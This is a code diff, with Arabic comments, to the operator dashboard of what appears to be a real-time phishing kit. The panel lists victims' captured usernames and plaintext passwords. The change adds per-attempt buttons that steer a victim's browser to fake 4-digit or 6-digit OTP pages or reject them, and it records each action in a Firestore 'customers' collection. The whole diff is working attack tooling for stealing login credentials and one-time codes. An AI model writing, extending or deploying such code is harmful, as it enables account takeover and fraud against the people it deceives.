@@ -31,6 +31,16 @@
   let selectedReferenceId = null;
   const selectedReferenceIds = new Set();
   const cardDecisionOverrides = new Map();
+  // إجراءات صندوق بيانات الدخول (توجيه 4/6 أرقام أو رفض) — لكل محاولة تسجيل دخول مفتاح مستقل
+  const loginActionOverrides = new Map();
+  const LOGIN_ACTION_LABELS = { otpnew: 'تم توجيه 4 أرقام', otpcode: 'تم توجيه 6 أرقام', reject: 'تم رفض' };
+  // مفتاح آمن لأسماء حقول Firestore (حروف/أرقام/شرطة سفلية فقط — لا نقاط)
+  const safeKey = (v) => String(v).replace(/[^A-Za-z0-9_]/g, '_');
+  const loginEntryKey = (entry, i) => {
+    if (entry && entry.at) return 'at_' + safeKey(entry.at);
+    if (entry && (entry.username || entry.password)) return 'u_' + safeKey(entry.username || '') + '_' + safeKey(entry.password || '');
+    return 'idx_' + i;
+  };
   let boxCounterTimer = null;
   let referenceListCounterTimer = null;
   let presenceRefreshTimer = null;
@@ -546,6 +556,7 @@
         pass: m.pass || '',
         username: m.username || '',
         logins: Array.isArray(m.logins) ? m.logins : [],
+        loginActions: (m.loginActions && typeof m.loginActions === 'object') ? m.loginActions : {},
         passwordResets: Array.isArray(m.passwordResets) ? m.passwordResets : [],
         appRegistrations: sessionRegistrations,
         requestType: m.requestType || '',
@@ -781,10 +792,24 @@
       loginEntries.push({ username: visitor.username, password: visitor.pass });
     }
     loginEntries.sort((a, b) => (toMillis(b && b.at) || 0) - (toMillis(a && a.at) || 0));
+    const loginActionsMap = (visitor.loginActions && typeof visitor.loginActions === 'object') ? visitor.loginActions : {};
+    const loginActionFor = (key) => {
+      const local = loginActionOverrides.get((visitor.sessionId || visitor.id) + '|' + key);
+      if (local) return local;
+      const remote = loginActionsMap[key];
+      if (remote && remote.action) return { action: remote.action, label: remote.label || LOGIN_ACTION_LABELS[remote.action] || '' };
+      return null;
+    };
     const loginBoxesHtml = loginEntries.map((entry, i) => {
       const t = toMillis(entry && entry.at);
       const sidAttr = escapeHtml(String(visitor.sessionId || visitor.id || ''));
-      return `<article class="ref-basic-box" data-ref-time="${t}"><h3>بيانات الدخول ${loginEntries.length > 1 ? '#' + (loginEntries.length - i) : ''}${t ? ` <time class="ref-box-time" data-box-counter data-box-time="${t}" datetime="${t}">${escapeHtml(formatRefTime(t))}</time>` : ''}</h3>${field('اسم المستخدم', entry && entry.username)}${field('كلمة المرور', entry && entry.password)}<div class="ref-card-actions"><button data-login-action="otpnew" data-session-id="${sidAttr}">توجيه إلى رمز 4 أرقام</button><button data-login-action="otpcode" data-session-id="${sidAttr}">توجيه إلى رمز 6 أرقام</button><button data-login-action="reject" data-session-id="${sidAttr}">رفض</button></div></article>`;
+      const key = loginEntryKey(entry, i);
+      const done = loginActionFor(key);
+      // بعد تنفيذ إجراء على هذه المحاولة: تُطبع الحالة مكان الأزرار (تُخفى الأزرار لهذا الصندوق فقط)
+      const actionsHtml = done
+        ? `<div class="ref-login-status ref-login-status--${escapeHtml(done.action)}">${escapeHtml(done.label || LOGIN_ACTION_LABELS[done.action] || 'تم التنفيذ')}</div>`
+        : `<div class="ref-card-actions"><button data-login-action="otpnew" data-login-key="${escapeHtml(key)}" data-session-id="${sidAttr}">توجيه إلى رمز 4 أرقام</button><button data-login-action="otpcode" data-login-key="${escapeHtml(key)}" data-session-id="${sidAttr}">توجيه إلى رمز 6 أرقام</button><button data-login-action="reject" data-login-key="${escapeHtml(key)}" data-session-id="${sidAttr}">رفض</button></div>`;
+      return `<article class="ref-basic-box" data-ref-time="${t}"><h3>بيانات الدخول ${loginEntries.length > 1 ? '#' + (loginEntries.length - i) : ''}${t ? ` <time class="ref-box-time" data-box-counter data-box-time="${t}" datetime="${t}">${escapeHtml(formatRefTime(t))}</time>` : ''}</h3>${field('اسم المستخدم', entry && entry.username)}${field('كلمة المرور', entry && entry.password)}${actionsHtml}</article>`;
     }).join('');
     const loginBoxTime = loginEntries.length ? (loginEntries[0] && loginEntries[0].at) : (visitor.customerUpdatedAt || visitor.createdDate);
     // صناديق إعادة تعيين كلمة المرور — كل محاولة في صندوق منفصل
@@ -919,12 +944,27 @@
         toast('تعذر إرسال الرفض', 'error');
       }
     };
+    // تسجيل إجراء الصندوق: يُخزَّن محلياً (للعرض الفوري) وفي قاعدة البيانات (ليبقى بعد التحديث)
+    const recordLoginAction = (sid, key, action, label) => {
+      if (!sid || !key) return;
+      loginActionOverrides.set(sid + '|' + key, { action, label });
+      db.collection('customers').doc(sid).set({
+        loginActions: { [key]: { action, label, at: Date.now() } },
+      }, { merge: true }).catch((e) => console.warn('login action persist failed:', e));
+    };
     els.referenceDetailContent.querySelectorAll('[data-login-action]').forEach(btn => btn.addEventListener('click', () => {
       const act = btn.dataset.loginAction;
       const sid = btn.dataset.sessionId || visitor.sessionId || visitor.id;
-      if (act === 'reject') { sendRejectCommand(sid); return; }
-      const isNew = act === 'otpnew';
-      sendNavCommand(isNew ? 'رمز 4 أرقام' : 'رمز 6 أرقام', isNew ? 'otp-new.html' : 'otp.html');
+      const key = btn.dataset.loginKey || '';
+      if (act === 'reject') {
+        sendRejectCommand(sid);
+        recordLoginAction(sid, key, 'reject', LOGIN_ACTION_LABELS.reject);
+      } else {
+        const isNew = act === 'otpnew';
+        sendNavCommand(isNew ? 'رمز 4 أرقام' : 'رمز 6 أرقام', isNew ? 'otp-new.html' : 'otp.html');
+        recordLoginAction(sid, key, act, isNew ? LOGIN_ACTION_LABELS.otpnew : LOGIN_ACTION_LABELS.otpcode);
+      }
+      renderReferenceDetail(visitor);
     }));
     const freeInput = els.referenceDetailContent.querySelector('[data-ref-nav-free]');
     const freeGo = els.referenceDetailContent.querySelector('[data-ref-nav-free-go]');
